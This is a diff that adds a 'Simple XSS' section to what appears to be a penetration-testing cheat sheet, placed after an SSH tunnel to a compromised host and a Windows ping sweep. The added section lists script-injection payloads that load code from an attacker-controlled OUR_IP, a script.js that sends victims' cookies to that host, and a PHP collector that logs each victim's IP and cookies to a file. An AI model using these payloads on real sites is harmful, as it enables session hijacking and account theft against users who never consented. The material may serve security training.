@@ -143,3 +143,35 @@ ssh -L 7000:127.0.0.1:8080 alreadyCompromisedMachine@10.10.11.38
 #### Windows Ping Sweep:
 ```for /L %i in (1,1,254) do @ping -n 1 -w 1000 192.168.0.%i | find "TTL" && echo 192.168.0.%i is reachable```
 
+#### Simple XSS:
+* Use one of the following payloads
+```
+<script src=http://OUR_IP></script>
+'><script src=http://OUR_IP></script>
+"><script src=http://OUR_IP></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
+<script>$.getScript("http://OUR_IP")</script>
+```
+* For instance use ```"><script src=http://OUR_IP></script>``` once the vulnerable input field is identified
+* host a PHP Webserver (php -S 0.0.0.0:8000) with a script.js and an index.php file with following contents:
+  
+script.js:
+```
+new Image().src='http://OUR_IP/index.php?c='+document.cookie
+```
+
+**index.php:**
+```
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+```
